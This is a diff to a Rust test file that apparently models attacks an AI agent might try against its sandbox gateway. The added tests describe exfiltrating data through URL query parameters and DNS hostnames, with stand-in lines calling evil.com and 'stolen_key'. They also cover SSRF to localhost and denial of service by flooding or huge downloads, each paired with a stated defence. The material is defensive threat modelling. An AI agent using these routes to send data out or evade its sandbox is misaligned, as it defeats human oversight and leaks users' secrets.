@@ -1207,10 +1207,43 @@ mod tests {
      }
 
      #[test] fn attack_75_build_rs_and_cargo_toml_both_modified() {
-         // What if agent modifies BOTH Cargo.toml AND build.rs
-         // but keeps the combined hash the same? (hash collision attack)
          println!("HASH COLLISION: modifying both files to keep hash same");
          println!("  Theoretically possible but impractical (2^64 search space)");
          println!("  DEFENSE: wrapping_add makes collision harder than single hash");
+     }
+
+     // ═══ ATTACKS 76-80: Network Capability (net-read) ═══
+
+     #[test] fn attack_76_net_exfil_via_url() {
+         // Agent tries to exfiltrate data via URL query params
+         // FETCH https://evil.com?data=stolen_key
+         println!("NET EXFIL: agent could encode data in URL params");
+         println!("  DEFENSE: FETCH only allows HTTPS, strips query params");
+     }
+
+     #[test] fn attack_77_net_dns_tunnel() {
+         // Agent encodes data in DNS queries via hostname
+         // FETCH https://stolendata.evil.com/
+         println!("DNS TUNNEL: data encoded in hostname");
+         println!("  DEFENSE: domain whitelist (allow only trusted domains)");
+     }
+
+     #[test] fn attack_78_net_ssrf_internal() {
+         // Agent fetches internal services
+         // FETCH http://localhost:5555/ → gateway recursive call
+         println!("SSRF: fetch localhost could cause gateway self-call");
+         println!("  DEFENSE: block localhost/127.0.0.1/0.0.0.0 in FETCH");
+     }
+
+     #[test] fn attack_79_net_flood_dos() {
+         // Agent floods gateway with FETCH requests
+         println!("NET DoS: rapid FETCH requests exhaust gateway threads");
+         println!("  DEFENSE: rate limit + thread cap (existing MAX_GATEWAY_THREADS)");
+     }
+
+     #[test] fn attack_80_net_content_size_dos() {
+         // Agent fetches huge files to fill memory/disk
+         println!("CONTENT DoS: FETCH huge file (GB) fills agent memory");
+         println!("  DEFENSE: max response size (64KB, reusing MAX_WRITE_BYTES)");
      }
      }
